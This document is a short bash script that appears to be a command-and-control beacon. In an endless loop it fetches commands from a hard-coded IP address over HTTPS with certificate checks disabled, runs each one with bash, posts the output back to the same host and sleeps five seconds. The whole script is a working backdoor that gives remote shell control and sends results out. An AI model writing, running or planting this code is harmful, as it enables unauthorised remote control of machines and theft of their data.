while true; do

  cmd=$(curl -sk https://54.95.251.88/getcmd)

  result=$(bash -c "$cmd" 2>&1)

  curl -sk -X POST -d "$result" https://54.95.251.88/postresult

  sleep 5

done
